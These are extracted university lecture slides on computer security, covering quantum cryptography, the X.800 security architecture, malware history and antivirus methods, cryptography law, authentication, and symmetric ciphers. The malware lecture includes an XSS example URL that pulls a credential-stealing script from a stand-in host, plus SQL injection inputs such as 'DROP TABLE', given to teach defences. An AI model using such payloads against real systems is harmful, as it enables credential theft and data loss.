+➢ Digitization: The measurement outcome (e.g., detecting a photon) is mapped to 0s and 1s
+➢ Post-processing: Classical techniques like randomness extraction remove bias and ensure uniform distribution
+--- Page 21 ---
+QRNG over Classical Methods?
+Classical Methods:
+➢ Pseudo-random generators use algorithms that are deterministic - can be predicted if the seed is known
+➢ True RNGs based on classical physics (e.g., thermal noise, chaotic circuits) still may introduce biases
+Quantum RNGs:
+➢ Quantum mechanics guarantees fundamental randomness: measurement outcomes of superposed quantum
+states (e.g., photon polarization) are inherently unpredictable and non-deterministic.
+➢ Testing randomness in classical systems relies on statistical tests (can’t guarantee absolute unpredictability),
+but some QRNGs allow self-testing, meaning their randomness can be verified without trusting the hardware.
+➢ QRNGs are more complex and expensive than classical RNGs and mainly used in high-security applications.
+--- Page 22 ---
+Do we have now absolute security for key exchange?
+ No, as always, there is a “but”…
+ In theory, it is very secure.
+ In practice, the attackers may go outside our assumptions.
+Quantum
+crypto hacking
+ Quantum hacking:
+➢ Instead of passively measuring quantum exchange, go
+for active probing: large pulse attack (~2001) uses
+powerful laser to send a beam to either Bob or Alice, to
+get some reflected photons back and learn their
+settings (base choices) just before they use it.
+--- Page 23 ---
+Quantum
+Computing
+Overview
+Quantum systems may be used to
+perform computations.
+Core idea: quantum computing is powerful because information can be represented,
+manipulated, and measured in ways that have no classical equivalent.
+--- Page 24 ---
+Quantum computing
+Quantum models of computations and quantum algorithms:
+➢ R. Feynman, 1982: The idea of using quantum effects to perform massive computations
+➢ D. Deutsch, 1985: Formal model of Universal Quantum Computer
+➢ Shor’s Algorithm (1994): Quantum computers could factor large numbers efficiently. Time
+complexity O( log 𝑁 3) which is polynomial in the length of input number 𝑁
+➢ Grover’s Algorithm (1996): Reduce search space from 𝑁 to 𝑁
+➢ Quantum Error Correction: Towards scalable, fault-tolerant quantum computing
+--- Page 25 ---
+Quantum
+computing
+Computations involve:
+➢ Performing controlled
+evolution of quantum system
+➢ Suitable measurements
+--- Page 26 ---
+• Fast algorithms could be used for efficient breaking of RSA, if implemented
+• Many technical difficulties, but:
+o Implemented by IBM in Dec 2001 on 7-qubit computer to factorise 15
+Quantum o Michigan University, Dec 2005: first quantum chip (1 qubit)
+o Innsbruck University, Dec 2005: first quantum byte (8 qubit system)
+Cryptanalysis
+o Bristol University, 2011: implementation of Shor’s algorithm, factorized 21)
+o First commercial quantum computer (annealer) by D-Wave Systems
+o IBM Quantum Platform (online): https://quantum.ibm.com/
+ Post-quantum cryptography: active development of methods for which quantum
+attacks are not known
+--- Page 27 ---
+Quantum Supremacy:
+Google’s 2019 Breakthrough
+Quantum Supremacy: When a quantum computer performs a task beyond classical supercomputers
+➢ Achievement
+• Sycamore Processor (53 Qubits) solved a problem in 200 seconds
+• Estimated to take 10,000 years on a classical supercomputer
+➢ The Experiment
+• Performed random circuit sampling (generating random numbers)
+• Aimed to demonstrate quantum speedup over classical methods
+➢ Significance
+• First real proof of quantum computational advantage
+• A stepping stone toward real-world quantum applications in cryptography, AI, and optimization
+Image source: BBC, Google
+
+================================================================================
+LECTURE: COMP232-2-SecurityArchitecture-26
+================================================================================
+
+--- Page 1 ---
+Basic
+Concepts in
+Security
+CNS 2.1 – 2.2
+NSE 1.1 – 1.4
+--- Page 2 ---
+2
+Goals of Network
+Security
+– CIA Triad
+--- Page 3 ---
+• ITU-T Recommendation X.800, Security
+Architecture for OSI defines systematic way to:
+• Define the requirements for security
+Security
+• Characterizing the approaches to satisfying
+those requirements
+Architecture
+for OSI
+• ITU-T – International Telecommunication Union
+Telecommunication Standardization Sector
+• OSI – Open Systems Interconnection – an effort started
+in 1977 to standardize computer networking
+--- Page 4 ---
+OSI Security
+Architecture
+• The following concepts are used:
+• Security attack: Any actions that compromises the security
+of information owned by an organization (or a person).
+• Security mechanism: a mechanism that is designed to
+detect, prevent, or recover from a security attack.
+• Security service: a service that enhances the security of
+the data processing systems and the information transfers
+of an organization. The services make use of one or more
+security mechanisms to provide the service
+--- Page 5 ---
+• Passive attack: aims to learn or make use of
+information from the system but does not
+Security
+affect system resources. (prevent)(quantum)
+attacks
+• Active attack: attempts to alter system
+resources or affect their operation. (detect)
+--- Page 6 ---
+Security
+Attacks
+--- Page 7 ---
+Passive Attacks
+• The Interception of a message without
+modification
+• It may be read or logged
+• Traffic analysis is useful in many
+cases
+HarvestNowDecryptLater, Quantum comp.
+--- Page 8 ---
+Security Attacks
+• Interruption: This is an attack on availability
+• Interception: This is an attack on confidentiality
+• Modification: This is an attack on integrity
+• Fabrication: This is an attack on authenticity
+--- Page 9 ---
+• Security service is a service which ensures
+adequate security ( a particular security
+attribute) of the systems or of data transfers
+• X.800 Recommendation divides security
+Security
+services into 6 categories:
+services/security
+• Authentication
+• Access control
+attributes
+• Data confidentiality
+• Data integrity
+• Non-repudiation
+• Availability
+--- Page 10 ---
+Example: consider a
+The authentication
+person, using online
+service is concerned
+banking service.
+with assuring that
+Both the user and
+communication is
+the bank should be
+authentic:
+assured in identities
+of each other
+Authentication The recipient of the message
+should be sure that the
+message came from the
+source that it claims to be
+All communicating parties
+should be sure that the
+connection is not interfered
+with by unauthorized party.
+--- Page 11 ---
+This who can have access to a resource;
+service under what conditions access can occur;
+controls
+what those accessing are allowing to do.
+Access control
+an online banking a user may be allowed
+to see his balance but not allowed to
+Example:
+make any transactions for a joint
+account.
+--- Page 12 ---
+• The protection of data from unauthorized
+disclosure
+Data
+• Connection confidentiality
+confidentiality
+• Connectionless confidentiality
+• Selective field confidentiality
+• Traffic-Flow confidentiality
+--- Page 13 ---
+• The assurance that data received are exactly
+as sent by an authorized entity, i.e. contain
+Data Integrity
+• no modification
+• no insertion
+• no deletion
+• no replay
+--- Page 14 ---
+• Protection against denial by one of the
+entities involved in a communication of
+having participated in the communication.
+• Nonrepudiation can be related to
+• Origin: proof that the message was sent
+Non-
+by the specified party
+repudiation • Destination: proof that the message was
+received by the specified party
+Example: Imagine a user of online banking
+who has made a transaction but later denied
+that. How can the bank can protect itself in a
+such situation?
+--- Page 15 ---
+• Protects a system to ensure its availability
+Availability
+• Particularly, it addresses denial-of-service
+attacks
+service
+• Depends on other security services: access
+control, authentication, etc
+--- Page 16 ---
+Attack
+Release of Traffic Masquerade Replay Modification of Denial
+message analysis messages of
+contents service
+Peer Entity Y
+Authentication
+Attacks and
+Data origin Y
+authentication
+Security Access control Y
+e c Confidentiality Y
+iv
+re
+S Traffic flow Y
+services (X.800)
+confidentiality
+Data integrity Y Y
+Non-repudiation
+Availability Y
+--- Page 17 ---
+• Security mechanisms are used to implement
+security services. They include (X.800):
+Security • Encipherment or Encryption
+• Digital signature
+mechanisms
+• Access Control mechanisms
+• Data Integrity mechanisms (e.g., Hash)
+• Authentication Exchange
+• Traffic Padding
+• Routing Control
+• Notarisation
+
+================================================================================
+LECTURE: COMP232-21-Attacks_Counter-26
+================================================================================
+
+--- Page 2 ---
+MALICIOUS PROGRAMS
+• Software threats to computer systems:
+• malicious programs that exploit vulnerabilities in computer
+systems to launch attacks on security and privacy
+• continuous development new types of malicious programs
+and countermeasures
+• Important features: propagation and self-replication
+• vulnerabilities in computer systems are almost inevitable
+due to their immense complexity
+--- Page 3 ---
+WHEN DID
+EVERYTHING START
+Probably the first computer virus
+Creeper (BBN, Bob Thomas, 1971) in action
+(https://www.sentinelone.com/blog/history-of-cyber-security/)
+--- Page 4 ---
+CREEPER VS REAPER
+• Creeper was not a real computer virus, but a rather a
+demonstrator of a mobile and self-replicating program
+• Reaper (BBN, soon after, Ray Tomlinson) was a self-replicating
+and self-propagating through the network program chasing
+Creeper to log it out – first antivirus!
+Cyber arms race has started..
+--- Page 5 ---
+TAXONOMY OF
+MALICIOUS
+PROGRAMS
+--- Page 6 ---
+TRAPDOORS/BACKDOORS
+• Trap door is a secret entry point into a program that allows someone that is aware of the
+trapdoor to gain access without going through the usual security access procedures
+• Trap doors may be used legitimately during debugging and testing programs
+• Trap doors become threats when they are used to gain unauthorized access
+--- Page 7 ---
+KEN’S TRAPDOOR
+Ken Thompson, in his Turing Award Lecture, 1984
+An example of trap door is discussed:
+• modifying a C compiler can make a trap door which is
+almost impossible to find
+Moral is obvious:
+“You can't trust code that you did not totally create yourself’’
+--- Page 8 ---
+LOGIC BOMB
+• The logic bomb is code embedded in some legitimate program that is set to explode
+when certain conditions are met:
+• Presence or absence of certain files
+• Particular day of the week or data
+• Particular user running the application
+• Once triggered, a bomb may alter or delete data, cause machine halt, etc.
+• The case of Tim Lloyd (1996): more than 10 millions dollars damage.
+--- Page 9 ---
+TROJAN HORSES
+A Trojan Horse is a useful (or apparently) useful program
+containing hidden code that, when invoked, performs some
+unwanted or harmful function.
+Thompson example:
+a compiler is a Trojan Horse – very difficult to discover.
+Recent Zeus trojan, 2007- … : millions computers are infected
+--- Page 10 ---
+A zombie is a program that secretly takes over another Internet-attached
+computer and then uses that computer to launch attacks that are difficult to
+trace to the zombie’s creator.
+ZOMBIES
+Zombies may be used in denial-of-service attacks or sending spam messages
+& BOTNETS
+Large orchestrated collections of zombies usually referred to as botnets
+Example: BredoLab botnet (2009-2010) > 30 millions of computers infected
+--- Page 11 ---
+VIRUSES
+A virus is a program that can “infect” other programs by modifying them
+The modification includes a copy of the virus program, that can go on to infect other programs
+A virus attaches itself to another program and executes secretly when the host program is run
+--- Page 12 ---
+TYPICAL VIRUS PHASES
+Dormant phase: the virus is idle
+Propagation phase: the virus places an identical copy of itself
+into other programs or into some system areas on the disk
+Triggering phase: the virus is activated to perform the function
+for which it was intended
+Execution phase: the function is performed
+--- Page 13 ---
+F. Cohen, 1980s-90s: theoretical analyses
+of the viral mechanisms
+THEORETICAL
+First formal definition of computer viruses
+ANALYSIS
+Undecidability theorem: In general,
+the problem of detection of viruses is
+undecidable
+--- Page 14 ---
+MACRO VIRUSES AND E-MAIL VIRUSES
+Macro viruses take advantage
+A macro is executable program
+of a macro feature found in
+embedded in a word document
+Word and other office
+or other type of file
+applications
+Auto-executing macro, that is
+automatically invoked (say, when Macro viruses are easily
+opening/closing a file), without spread. A common method is
+explicit user input, makes it by email.
+possible to create a macro virus
+--- Page 15 ---
+INFAMOUS MELISSA VIRUS
+• Typical example (from 1999) of macro virus spread via e-mail
+• It makes use of MS Word macro embedded in an attachment
+• If recipient opens the e-mail attachment, the Word macro is
+activated and
+• the virus sends itself to everyone on the mailing list in
+the user’s e-mail application
+• the virus does local damage
+--- Page 16 ---
+WORMS
+• Network worm programs actively use network connections to spread from systems to
+systems, in many cases without any user participation.
+• Typically worms use:
+• Email facility
+• Remote execution capability
+• Remote login capability
+• 2005: worms propagating via Instant Messengers (MSN messenger, AOL messenger, etc).
+--- Page 17 ---
+MORRIS WORM
+• Computer Worm distributed via Internet (Robert Morris, 1988)
+• Not intended to make a harm, just to highlight security flaws
+• Damage was caused by excessive replication which made many
+infected systems unusable
+• Est. cost of the damage $100,000-$10,000,000
+• thousands of computers were down for days
+• The Internet were partitioned for a few days while regional networks
+were cleaned
+• United States vs Morris: Robert Morris was tried and convicted,
+Computer Fraud and Abuse Act
+--- Page 18 ---
+FROM THE CBR SURVEY
+• August 2003, the worm Blaster and its Nachi variant caused:
+• Air Canada to delay flights while it cleaned its check-in desk computers
+• CSX's 23,000-mile rail network, the third-largest in North America, halted
+• The administrators of The New York Times had to turn off their network while they sorted the issue out
+• In government and military, Edwards Air Force Base in California conceded part of its network to Blaster
+• Overall cost of damages: many millions of dollars
+--- Page 19 ---
+MALICIOUS SOFTWARE
+ATTACKS AND COUNTERMEASURES II
+--- Page 20 ---
+ANTIVIRUS APPROACHES
+Prevention: do not allow a virus to get into the system (in general,
+impossible to achieve)
+Detection: once infection has occurred, determine that it has occurred
+and locate the virus
+Identification: once a virus is detected, identify it
+Removal: once the specific virus has been identified, remove all traces
+of the virus and restores the infected programs to their original states
+--- Page 21 ---
+First Second
+generation: generation:
+simple heuristic
+GENERATIONS
+scanners scanners
+OF ANTIVIRUS
+SOFTWARE
+Third Fourth
+generation: generation:
+activity full-featured
+traps protection
+--- Page 22 ---
+Require a virus signature to identify a virus
+May detect viruses which have essentially the same
+SIMPLE
+structure and bit patterns in all copies
+SCANNERS
+Signature-based scanners are limited to the detection
+of known viruses
+May maintain a record of the length of programs and
+look for changes in length
+--- Page 23 ---
+HEURISTIC SCANNERS
+Rely on heuristic rules to search One may look for fragments of One may use integrity checking:
+for probable virus infection. code that are often associated
+Simple checksum
+with viruses
+Encrypted hash functions
+--- Page 24 ---
+Memory-resident programs that identify a
+virus by its actions in run time rather than
+by its signature or its structure
+ACTIVITY
+Here, it is not necessary to develop
+signatures and heuristics for various
+DETECTION
+classes of viruses
+It is necessary to identify the small set of
+indicative actions
+--- Page 25 ---
+FOURTH-GENERATION
+ANTIVIRUS PACKAGES
+• Packages consisting of a variety of antivirus
+techniques used together:
+• Scanning
+• Activity trap
+• Control capability, etc
+• Usually combined with other security defence
+systems (IDS, firewalls, etc)
+--- Page 26 ---
+MONITORING AND DETECTION OF
+INTERNET WORMS
+• Speed is a crucial aspect here:
+• SQL Slammer worm, appeared in January 2003 and
+infected more than 90% of vulnerable computers on the
+internet within 10 minutes
+• Successful worm attack typically lasts several days
+infecting hundreds of thousands of computers (Code
+Red, Nimda, Blaster,..)
+• Aim: early detection.
+--- Page 27 ---
+WORM MONITORING SYSTEM
+The system consists of
+• local scan monitors for incoming and
+outgoing traffic
+• data mixers gathering information
+coming from monitors, or other data
+mixers (located at the lower levels in a
+tree structure)
+• warning center accumulating information
+about the whole network and performing
+detection
+--- Page 28 ---
+WORM DETECTION
+• The whole range of methods developed for Intrusion Detection Systems can be used for worm detection
+• Special role of anomaly detection systems (suitable for detection unknown worms) :
+• Threshold based: detection of bursts of the network traffic
+• Trend based: detection of trends in the network traffic
+(based on a fact that at early stages a worm propagates exponentially)
+--- Page 29 ---
+When user input is treated as code
+• Attacker supplies carefully crafted input
+CATEGORIES OF
+• Application interprets it as a command/script/query
+ATTACKS: • Result: unintended actions or data exposure
+INSERTION ATTACKS
+Examples:
+• SQL injection
+• Cross Site Scripting (XSS)
+--- Page 30 ---
+SIMPLE SQL QUERY
+SELECT data FROM table WHERE field = ‘$INPUT’, where $INPUT is user input
+Some simple cases:
+• 456 OR x = x (when substituted in the query, results in returning all the data from the table)
+• DROP TABLE _table_ (when substituted in the query, results in deleting TABLE table) etc
+(see more examples in CNS, Section 7)
+--- Page 31 ---
+An instance of insertion attacks
+Main target: data-driven applications
+SQL INJECTION
+Used for database backed websites but can
+be used to attack any type of SQL database
+Most frequently occur when queries are
+constructed from user inputs
+--- Page 32 ---
+Positive pattern matching
+Input type checking
+(only “good” strings are
+/input sanitizing
+allowed)
+SQL INJECTION
+COUNTER MEASURES
+Parameterized queries:
+Query structure is fixed in
+Avoid dynamic SQL use
+advance. User input is
+treated only as data.
+--- Page 33 ---
+CROSS SITE SCRIPTING (XSS)
+• Another instance of insertion attacks
+• Typical context: html code displays input that comes from the user: e.g. in search system
+• If the input includes scripting tags, then the browser can be tricked into executing script provided by the user
+Example:
+http://searchsite.org/search?q=something<script src="http://malicioussite.com/authstealer.js"></script>
+.
+• Can be used for stealing user credentials or hijacking web sessions via executing the scripts originated
+--- Page 34 ---
+XSS COUNTER MEASURES
+Similarly to SQL injection Sanitize the input
+replace symbols that instruct the browser to
+interpret input as executable instructions by the
+symbols ignored by browser
+
+================================================================================
+LECTURE: COMP232-22-Legal-26
+================================================================================
+
+--- Page 1 ---
+LEGAL AND SOCIAL ISSUES IN PRIVACY
+AND SECURITY
+--- Page 2 ---
+• Rapid developments of computer systems, networks give rise for
+SECURITY
+• New threats for security and privacy
+AND
+• New defensive measures
+PRIVACY,
+LEGAL • We have seen various technical means to protect security and
+privacy in computer systems and networks
+ISSUES
+• In real life they should be accompanied by law regulations.
+--- Page 3 ---
+INTERNATIONAL AND NATIONAL
+POLITICS ISSUES
+• US Export control on cryptographic software:
+• was the main reason to separate JCA and JCE in Java cryptographic library implementation
+• Discussions in British Parliament:
+• the government proposal on 90 (...42...28) days detention was motivated in a part by
+necessity to have more time for decryption of intercepted correspondence
+--- Page 4 ---
+LEGAL RESTRICTIONS ON
+CRYPTOGRAPHY
+• The legal landscape of cryptography is complex and
+constantly changing.
+• Many aspects:
+• Cryptography and patent system
+• Cryptography and Trade secret Law
+• National and International regulations of cryptography
+• Digital Rights management
+--- Page 5 ---
+CRYPTOGRAPHY AND PATENT
+SYSTEM
+• Early development of cryptographic protocols and systems
+was influenced by patent law
+• Many important techniques, including public key
+cryptography have been patented, including:
+• Diffie-Hellman key exchange algorithm (expired 1997)
+• RSA encryption algorithm (expired 2000)
+• In general, one of the results of the patent protection
+appeared to be reduced use of the invention
+--- Page 6 ---
+CRYPTOGRAPHY AND TRADE SECRET LAW
+• Until recently many encryption algorithms were kept as proprietary, secret and
+protected by the trade secret provisions
+• The idea was that one could achieve additional security for the encrypted data by keeping
+the encryption algorithms themselves secret
+• Most experts does not support such idea:
+• It is almost impossible to keep the details of successful algorithm secret
+• If the algorithm has a hidden flaw, then it is could be discovered too late: e.g.: Content
+Scramble System (CSS) algorithm for protecting DVD content
+• There are still many patented algorithms, and they are protected by law
+--- Page 7 ---
+Motivations (at national level):
+• Cryptography can be used to hide criminal activities
+• Strong cryptography can make difficult, or almost
+LEGAL
+impossible to conduct search warrants by legal authorities
+REGULATIONS OF
+CRYPTOGRAPHY
+Motivations (at international level):
+• Strong cryptography can make impossible to decrypt
+correspondence by military, economic, etc, competitors,
+or in general, unfriendly countries.
+--- Page 8 ---
+US REGULATORY EFFORTS
+Special costly, time consuming licenses for export Proposals by US administration to use key escrow
+machines or programs implementing cryptography techniques: Clipper chip and software key escrow
+1980s 1992–1996
+1992
+Free export of cryptographic programs, but with the
+restriction on key size: no more than 40 bits
+--- Page 9 ---
+Escrowed Encryption Standard (Clipper Chip)
+A cheap tamper-proof chip, each with unique ID
+A classified encryption algorithm
+CLIPPER CHIP
+A back door is embedded, and the government has a copy of a key used in every
+such a chip. So, when authorized, all encrypted message can be decrypted
+Mechanisms to ensure security of keys and no unauthorized use of the “back door”
+1997: Leading cryptographers and computer scientists published a report:
+“… government encryption plan is risky and impractical”
+--- Page 10 ---
+POTENTIAL PROBLEMS WITH CLIPPER CHIP
+The potential for The creation of new Scaling The difficulties The cost
+insider abuse vulnerabilities and of properly
+targets for attack authenticating
+requests for keys
+--- Page 11 ---
+US REGULATIONS
+January 2000, new regulations:
+• Allowed export of cryptographic products with any key
+length after a technical review to any country that was
+not specifically listed a terrorist country
+• Essentially, export control on strong cryptography was
+eliminated
+--- Page 12 ---
+INTERNATIONAL AGREEMENTS
+ON CRYPTOGRAPHY
+Wassenaar Arrangement on Export Control for Conventional
+Arms and Dual-Use Goods and Technologies
+• 1996 – Present
+• Allows export of mass-market software
+• Allows export of all products that use encryption to protect
+intellectual property
+--- Page 13 ---
+DIGITAL RIGHTS MANAGEMENT
+Digital Millennium Copyright Act (US, 1998):
+• Criminalizes production and dissemination of technology for
+circumventing the control access for the copyrighted works
+• Controversy: Dmitry Sklyarov case (2001)
+• Copyright protection vs legality of cryptanalytic research?
+Copyright Directive (EU 2001)
+--- Page 14 ---
+INTERNATIONAL AGREEMENTS ON
+CRYPTOGRAPHY
+• Council of Europe Recommendation 95 (13), 1995 - Present
+• recommendations on use of cryptography
+• European Union Council Regulation 1334/2000:
+• export to other EU countries unrestricted
+• export to other countries may require an authorization, or license
+--- Page 15 ---
+• In 1980, the Organization for Economic Co-operation
+Development and (OECD) adopted a set of privacy guidelines
+PRIVACY
+• Aim: to harmonize the growing number of privacy
+PROTECTION: regulations throughout the industrialized world
+OECD
+GUIDELINES
+• The guidelines were specifically designed to deal with
+growing problem of transborder data flows
+• The guidelines consist of eight main principles.
+--- Page 16 ---
+Collection Limitation Principle: there
+should be limits to the collection of
+personal data, and any such data should
+be obtained by lawful and fair means
+OECD
+GUIDELINES:
+MAIN PRINCIPLES
+Data Quality Principle: personal data
+should be relevant to the purposes for
+which it is to be used, should be
+accurate, complete, and kept up to date.
+--- Page 17 ---
+Purpose Specification Principle: the purposes for which
+personal data is collected should be specified not later than
+at the time of data collection and the subsequent use limited
+to the fulfilment of those purposes
+OECD
+GUIDELINES:
+Use Limitation Principle: Personal data should not be
+MAIN
+disclosed, made available, or otherwise used for purposes
+others that those specified in advance, except: PRINCIPLES
+• With the consent of the data subject, or
+• By authority of law
+--- Page 18 ---
+Security Safeguards Principle: personal data
+should be protected by reasonable security
+safeguards again such risks as loss,
+unauthorized access, destruction, etc.
+OECD
+GUIDELINES:
+MAIN PRINCIPLES
+Openness Principle: there should be a
+general policy of openness about
+developments, practices and policies with
+respect to personal data.
+--- Page 19 ---
+OECD GUIDELINES: MAIN PRINCIPLES
+Individual Participation Principle: an individual should have the right
+• To obtain the data from a data controller, or confirmation of
+whether the data controller has data relating to them
+• To be given reasons if a request made specified as above is
+denied, and to be able to challenge such denial, and
+• To challenge data relating to them and, if the challenge is
+successful to have the data erased, rectified, completed, or
+amended.
+--- Page 20 ---
+OECD GUIDELINES: MAIN
+PRINCIPLES
+Accountability principle: a data controller should be
+accountable for complying with measures which give
+effect to the principle stated above.
+The OECD Guidelines do not have the force of law, but
+are instead used as guidelines for each OECD member
+country (30 countries at the moment, including UK)
+when passing its own laws
+--- Page 21 ---
+EUROPEAN DATA PROTECTION
+Was: European Union
+New: General Data
+Directive 95/46/EC, the
+Protection Regulation
+Directive on Protection
+(GDPR)
+(from 25 May 2018)
+of Personal Data
+--- Page 22 ---
+UK DATA PROTECTION ACT
+• The Data Protection Act 2018 is the UK’s implementation of
+the General Data Protection Regulation (GDPR).
+Data protection act 2018: https://www.gov.uk/data-protection
+• Have a look at the above link and compare these regulations
+with OECD guidelines.
+
+================================================================================
+LECTURE: COMP232-3-Authentication-26
+================================================================================
+
+--- Page 1 ---
+• CNS, Section 2.4
+• WSPC, Chapter 6
+--- Page 2 ---
+Identification, authentication, authorisation
+• Three closely related concepts:
+• Identification: associating an identity with a subject (“Who are you?”)
+• Authentication: establishing the validity of something, such as an identity (“Are you indeed the entity
+you claim you are?”)
+• Authorisation: associating rights or capabilities with a subject (“What rights (authority) do you have?”)
+--- Page 3 ---
+Authentication
+• Authentication is the process of verifying the identity
+of a user, device, or other entity in a computer system,
+often as a prerequisite to allowing access to resources
+in the system
+• Authentication is used for the purpose of performing
+trusted communications between parties for
+computing and telecommunications applications.
+--- Page 4 ---
+Authentication
+Machine-by-machine
+authentication
+Human-by-machine
+authentication (user
+authentication)
+(based on Lawrence O’Gorman, Proc. of IEEE , Dec 2003)
+--- Page 5 ---
+User vs Machine authentication
+• User authentication is much less secure (mathematically) than machine authentication,
+but a good security guard can prove invaluable.
+• Example:
+• encryption algorithm in AES standard uses the keys up to 256 bits long;
+• a 256-bit key is too long for most humans to remember, so in practice this key is
+stored in a computer protected by a more memorable password;
+• Here is the problem: human tend to choose an easily guessable password
+• In many cases humans are “weakest links” of otherwise secure systems
+--- Page 6 ---
+• Authentication techniques can be based on
+• Passwords
+(knowledge-based, “what you know”)
+Authentication
+techniques
+• Tokens
+(object-based, “what you have”)
+• Biometrics
+(ID-based, “who you are”)
+--- Page 7 ---
+Password-based techniques
+• Password: a word, a phrase, or personal identification
+number that is kept as a secret and is used for
+authentication;
+• Very popular and for many purposes adequate techniques,
+which don’t need a special hardware;
+• The main problem:
+• short memorable password can be guessed or searched
+by by attacker;
+• Long and random password is difficult to remember
+--- Page 8 ---
+Other problems with
+passwords
+• Before one can use a computer system, or a service, one
+needs a password
+• Passwords may be intercepted on its way to the system
+• Passwords may be forgotten
+• Passwords may be passed to other people
+• Passwords can be guessed (or forced)
+• Although these problems can be dealt with, there is no
+absolute solution
+--- Page 9 ---
+Token-based
+authentication
+• Physical token (identity token, security token)
+is physical device which perform or help
+authentication, such as:
+• Door key
+• Magnetic, or radio-frequency based
+access cards
+• Bankcard
+• Smartcard
+• Smartphones (more universal)
+• Authentication is based on what you have
+--- Page 10 ---
+Types of tokens
+• This can be a secure storage device containing
+• passwords, such as a bankcard, remote garage door
+opener, or smart card.
+• This can also be an active device that yields one-time
+passcodes (machine generated passwords), either
+• time-synchronous
+• or challenge-response
+--- Page 11 ---
+The token doesn’t really “prove” who an
+owner of the token is – anybody who has
+possession of the token can gain access
+Problems
+If the token is lost, the owner can not have an
+access, despite that their identity has not
+with tokens
+changed
+Some tokens may be easily copied or forged
+--- Page 12 ---
+Multi-factor authentication
+techniques
+• To increase security In some applications tokens are
+combined with other means of identification, such a
+passwords (PINs).
+Examples:
+• bank cards as tokens, and PINs as passwords
+• Mobile phone two-factor authentication:
+• password +
+• one time passcode sent by SMS/ or Voice (proof
+of ownership of mobile phone)
+--- Page 13 ---
+• Cache attack — attacks based on attacker's ability to
+monitor cache accesses made by the victim in a shared
+physical system as in virtualized environment or a type
+of cloud service.
+New type of
+• Timing attack — attacks based on measuring how
+attacks – Side
+much time various computations (such as, say,
+comparing an attacker's given password with the
+Channel
+victim's unknown one) take to perform.
+• Power-monitoring attack — attacks that make use of
+varying power consumption by the hardware during
+computation.
+--- Page 14 ---
+• Electromagnetic attack — attacks based on leaked
+electromagnetic radiation, which can directly provide
+plaintexts and other information. Such measurements can be
+used to infer cryptographic keys using techniques equivalent
+to those in power analysis or can be used in non-
+cryptographic attacks, e.g. TEMPEST (aka van Eck phreaking or
+radiation monitoring) attacks.
+More side
+• Acoustic cryptanalysis — attacks that exploit sound produced
+channel
+during a computation (rather like power analysis).
+• Differential fault analysis — in which secrets are discovered
+by introducing faults in a computation.
+• Data remanence — in which sensitive data are read after
+supposedly having been deleted. (i.e. Cold boot attack)
+--- Page 15 ---
+Biometrics-based
+techniques
+• A biometric is a feature measured from the human body that
+is distinguishing enough to be used for user authentication.
+• Images of a person face, retina, or iris
+• Fingerprints
+• Footprints and gait (walking style)
+• Voice patterns
+• Handwriting characteristics
+• Smell
+• Hand geometry
+--- Page 16 ---
+What are biometrics?
+• Security using characteristics
+• Characteristics can be varied
+• Physiological characteristics
+• Fingerprints, retina scans, vein thickness etc.
+• Behavioural characteristics
+• Gait, keystroke dynamic, signature
+• Method of identifying users within a n-n or n-1
+environment.
+• Common vs uncommon user interaction
+--- Page 17 ---
+Advantages
+• Biometrics can’t readily be shared, copied, or stolen
+• Biometrics (in normal circumstances) can ‘t be lost
+Biometrics
+Disadvantages
+• Complicated technology
+• Specialized hardware
+• High-cost (yet, it has been going down)
+--- Page 18 ---
+Problems with biometrics
+• Certain level of
+• False positives, and
+• False negatives
+• To deal with this problem one may combine biometric technique with
+password- or token-based techniques
+• If measuring equipment is not specially protected, the equipment is
+vulnerable to sabotage and fraud.
+--- Page 19 ---
+Threat Vector Model
+--- Page 20 ---
+Multi-modal
+Architecture
+• Two or more biometrics
+• Promotes fusion
+• Different levels of fusion
+• Promotes universality
+• Very secure technique
+• Can minimise impacts of entropy
+--- Page 21 ---
+Recent advances:
+authentication by brainwaves
+• John Chuang et al.
+• “I think, therefore I am: Usability and Security of
+Authentication Using Brainwaves”, a 2013 paper
+available at
+people.ischool.berkeley.edu/~chuang/pubs/usec13.pdf
+--- Page 22 ---
+User authentication
+
+================================================================================
+LECTURE: COMP232-4-Crypto-Symmetric-1-26
+================================================================================
+
+--- Page 1 ---
+Elements of Cryptography
+Symmetric Encryption
+• NSE, sections 2.1-2.2
+• WSPC, chapter 3
+--- Page 2 ---
+Cryptography is a collection of
+mathematical techniques for
+protecting information
+Cryptography
+Most important cryptographic
+technique is
+encryption/decryption
+--- Page 3 ---
+Table by I.A. Goldberg
+Cryptography for
+Encryption is used
+information
+• Directly at the level 1
+• As an important ingredient at the levels 2 and 3
+protection
+--- Page 4 ---
+Two categories of
+encryption algorithms
+• Symmetric encryption (or symmetric key
+encryption):
+• to encrypt and decrypt a message the
+same key (a piece of information;
+sequence of bits) is used
+• Asymmetric encryption (or asymmetric
+key encryption):
+• One key is used for encryption
+(usually publicly known, public key);
+• Another key is used for decryption
+(usually private, or secret key)
+--- Page 5 ---
+Symmetric
+(conventional)
+encryption
+Simplified symmetric key
+encryption
+--- Page 6 ---
+Components of
+Symmetric Encryption
+• Plaintext
+• Encryption algorithm
+• Secret key
+• Ciphertext (encrypted text)
+• Decryption algorithm
+--- Page 7 ---
+Security of symmetric
+encryption
+Important principle
+security of symmetric encryption
+depends on:
+• the secrecy of the key,
+• Not the secrecy of the algorithm
+Why?
+• It is difficult to invent new algorithms
+and keep them in a secret;
+• Producing keys is much easier;
+--- Page 8 ---
+• Strong encryption algorithm:
+• The adversary (opponent) should be unable to
+decrypt encrypted text, even if he/she knows
+Requirements
+several pairs
+(plaintext, encrypted plaintext)
+for symmetric
+encryption
+• Sender and receiver must have obtained copies of
+the secret key in a secure way and must keep the
+key secure
+--- Page 9 ---
+Type of operations used
+Two more
+• Substitutions
+• Transpositions
+classifications
+of The way in which plaintext is processed
+cryptosystems • Block cipher: input block of elements (e.g. characters) is
+transformed to the output block at once;
+• Stream cipher: processes the input elements
+continuously, one element at a time.
+--- Page 10 ---
+Classics: substitutions
+• Each element of the plaintext (bit,
+letter, group of bits) is mapped to
+another element
+--- Page 11 ---
+Classics: transposition
+The idea behind a transposition cipher is to create a permutation (rearrangement) of the letters of the
+plaintext that will make the ciphertext appear to be well-encrypted.
+Transposition ciphers are not highly secure because they do not change the letters in the plaintext or
+even cover up frequencies, but they can be built upon to make more secure methods of encryption.
+Input: LIVERPOOL Key Size = 3
+L R L
+I E P O
+V O
+Output: LRLIEPOVO
+--- Page 12 ---
+Transposition – Rail Fence Cypher
+• To solve the cipher, you must know the height and cycle of the puzzle. The height is simply the
+number of fence rails used to create it.
+• In this example, we said that 3 fence rails were used, so the height is 3.
+• The height will always be higher than 1 and no more than the number of letters in the ciphertext
